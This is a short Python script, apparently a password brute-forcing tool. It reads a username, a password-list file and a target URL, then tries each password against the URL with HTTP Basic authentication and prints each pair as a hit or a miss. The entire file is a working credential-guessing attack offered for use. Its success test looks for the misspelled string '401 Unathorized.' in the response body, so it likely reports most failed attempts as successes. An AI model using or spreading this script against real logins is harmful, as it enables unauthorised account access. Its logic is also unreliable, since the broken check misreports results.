import requests


username = input('Enter Username: ')
password_file = input("Enter file name (with extension): ")
with open(password_file, "r") as h: 
    password = [ line.strip() for line in h.read().split('\n') if line]

url = input("Enter URL That You Want to Bruteforce: ")

for passwords in password:
    r = requests.get(url, auth=(username, passwords))
    if "401 Unathorized." in r.text:
            print(f"Not {username} and {passwords}")
    else:
        print(f"It is {username} and {passwords}")
